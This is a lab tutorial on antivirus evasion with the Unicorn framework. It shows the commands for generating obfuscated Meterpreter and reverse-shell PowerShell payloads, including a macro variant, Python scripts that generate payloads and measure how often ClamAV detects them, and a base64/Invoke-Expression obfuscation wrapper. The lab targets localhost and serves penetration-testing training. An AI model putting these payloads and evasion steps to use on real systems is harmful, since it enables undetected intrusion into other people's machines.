# 🛡️ Perform Antivirus Evasion with Unicorn  
## ⚔️ Advanced Payload Obfuscation & Detection Testing Lab

---

![Linux](https://img.shields.io/badge/OS-Ubuntu_Linux-blue)
![PowerShell](https://img.shields.io/badge/Tech-PowerShell_Payloads-purple)
![Metasploit](https://img.shields.io/badge/Framework-Metasploit-orange)
![Python](https://img.shields.io/badge/Automation-Python-green)
![Security](https://img.shields.io/badge/Domain-Offensive_Security-red)
![Level](https://img.shields.io/badge/Level-Advanced-darkred)

---

# 🎯 Objectives

✔ Install and configure Unicorn framework  
✔ Generate obfuscated PowerShell payloads  
✔ Apply multiple encoding & evasion techniques  
✔ Test payload detection against antivirus (ClamAV)  
✔ Automate payload generation & testing with Python  
✔ Analyze evasion effectiveness and detection patterns  

---

# 📌 Prerequisites

- 🐧 Linux command-line basics  
- ⚡ PowerShell payload understanding  
- 🎯 Penetration testing fundamentals  
- 🧠 Metasploit familiarity  
- 🐍 Basic Python programming skills  

---

# ☁️ Lab Environment

✔ Al Nafi Cloud Linux VM  
✔ Pre-installed Python 3.x  
✔ Internet access enabled  
✔ Admin privileges available  
✔ Security testing tools supported  

---

# 🧩 TASK 1 — Install & Setup Unicorn Framework

---

## 🔷 Step 1: Install Dependencies

```bash id="dep_install"
sudo apt update && sudo apt install -y git python3 python3-pip metasploit-framework
📦 Step 2: Clone Unicorn
cd /opt
sudo git clone https://github.com/trustedsec/unicorn.git
sudo chown -R $USER:$USER /opt/unicorn

cd /opt/unicorn
chmod +x unicorn.py
python3 unicorn.py --help
🔍 Step 3: Explore Capabilities
python3 unicorn.py --help
msfvenom --list payloads | grep windows
🧠 Key Features

✔ PowerShell payload obfuscation
✔ Macro-based attack generation
✔ DDE attack vectors
✔ Multi-layer encoding engine

💣 Step 4: Generate Basic Payload
mkdir -p ~/unicorn_lab
cd ~/unicorn_lab

python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp 127.0.0.1 4444
mv powershell_attack.txt payload_basic.txt
⚡ Step 5: Generate Multiple Variants
python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_https 127.0.0.1 443
mv powershell_attack.txt payload_https.txt

python3 /opt/unicorn/unicorn.py windows/shell/reverse_tcp 127.0.0.1 4445
mv powershell_attack.txt payload_shell.txt

python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp 127.0.0.1 4446 macro
mv powershell_attack.txt payload_macro.txt

ls -lh payload_*.txt
🧩 TASK 2 — Antivirus Testing (ClamAV)
🛡️ Step 1: Install Antivirus
sudo apt install -y clamav clamav-daemon
sudo systemctl stop clamav-freshclam
sudo freshclam
sudo systemctl start clamav-freshclam
clamscan --version
🧪 Step 2: EICAR Test
echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt
clamscan eicar.txt
📊 Step 3: Scan Payloads
clamscan payload_basic.txt
clamscan payload_https.txt
clamscan payload_shell.txt
clamscan payload_macro.txt
clamscan payload_*.txt --no-summary
📈 Step 4: Detection Analyzer Script
cat > detection_test.sh << 'EOF'
#!/bin/bash

echo "=== AV Detection Report ==="

TOTAL=0
DETECTED=0

for file in payload_*.txt; do
    [ -f "$file" ] || continue
    TOTAL=$((TOTAL+1))

    echo -n "$file => "

    if clamscan --no-summary "$file" | grep -q "FOUND"; then
        echo "DETECTED"
        DETECTED=$((DETECTED+1))
    else
        echo "NOT DETECTED"
    fi
done

EVASION=$(( (TOTAL - DETECTED) * 100 / TOTAL ))

echo "---------------------------"
echo "Total: $TOTAL"
echo "Detected: $DETECTED"
echo "Evasion Rate: ${EVASION}%"
EOF

chmod +x detection_test.sh
./detection_test.sh
🧩 TASK 3 — Python Automation Engine
🐍 Payload Automation Script
#!/usr/bin/env python3
import subprocess
import os

class PayloadAutomation:
    def __init__(self):
        self.unicorn = "/opt/unicorn/unicorn.py"
        self.out_dir = "automated_payloads"
        os.makedirs(self.out_dir, exist_ok=True)

    def generate_payload(self, ptype, lhost, lport, name):
        cmd = [
            "python3", self.unicorn,
            ptype, lhost, str(lport)
        ]

        subprocess.run(cmd)
        src = "powershell_attack.txt"
        dst = f"{self.out_dir}/{name}.txt"

        if os.path.exists(src):
            os.rename(src, dst)
            return dst
        return None

    def scan(self, file):
        result = subprocess.getoutput(f"clamscan {file}")
        return "FOUND" in result

    def run(self):
        payloads = [
            ("windows/meterpreter/reverse_tcp", 4444, "tcp"),
            ("windows/meterpreter/reverse_https", 443, "https"),
            ("windows/shell/reverse_tcp", 4445, "shell")
        ]

        results = []

        for ptype, port, name in payloads:
            file = self.generate_payload(ptype, "127.0.0.1", port, name)
            if file:
                detected = self.scan(file)
                results.append((file, detected))

        print("\n=== RESULTS ===")
        for r in results:
            print(r)

if __name__ == "__main__":
    PayloadAutomation().run()
🚀 Run Automation
python3 payload_automation.py
🧩 TASK 4 — Advanced Obfuscation (Concept Lab)
🔐 Obfuscation Framework
import base64
import random
import string

class Obfuscator:

    def random_var(self, n=8):
        return ''.join(random.choice(string.ascii_letters) for _ in range(n))

    def encode(self, data):
        return base64.b64encode(data.encode()).decode()

    def multi_encode(self, data):
        return self.encode(self.encode(data))

    def build(self, payload):
        encoded = self.multi_encode(payload)

        return f"""
$A='{encoded}'
$B=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($A))
Invoke-Expression $B
"""
🧩 TASK 5 — Testing Framework
📊 Testing Engine
import os
import hashlib
import subprocess

class Tester:

    def hash(self, file):
        with open(file,'rb') as f:
            data = f.read()
            return {
                "md5": hashlib.md5(data).hexdigest(),
                "sha256": hashlib.sha256(data).hexdigest()
            }

    def scan(self, file):
        out = subprocess.getoutput(f"clamscan {file}")
        return "FOUND" in out

    def run(self, dir):
        results = []

        for f in os.listdir(dir):
            path = os.path.join(dir, f)
            if os.path.isfile(path):
                results.append({
                    "file": f,
                    "hash": self.hash(path),
                    "detected": self.scan(path)
                })

        return results
🧯 TROUBLESHOOTING
❌ Unicorn Not Running
chmod +x /opt/unicorn/unicorn.py
python3 --version
❌ ClamAV Not Detecting
sudo freshclam
sudo systemctl restart clamav-daemon
❌ Python Errors
pip3 install requests
which python3
🧠 LAB OUTCOME

✔ Unicorn framework deployed
✔ Multiple obfuscated payloads generated
✔ Antivirus testing completed using ClamAV
✔ Python automation pipeline built
✔ Detection analysis completed

🚀 KEY TAKEAWAYS
🧠 Obfuscation reduces detection but not guarantees evasion
⚡ Multi-layer encoding improves stealth
🐍 Automation enables scalable payload testing
🛡️ Antivirus detection is behavior + signature based
🎯 No payload is fully undetectable
⚠️ DISCLAIMER

This lab is strictly for authorized cybersecurity training and ethical penetration testing only.
Unauthorized use of evasion techniques is illegal.
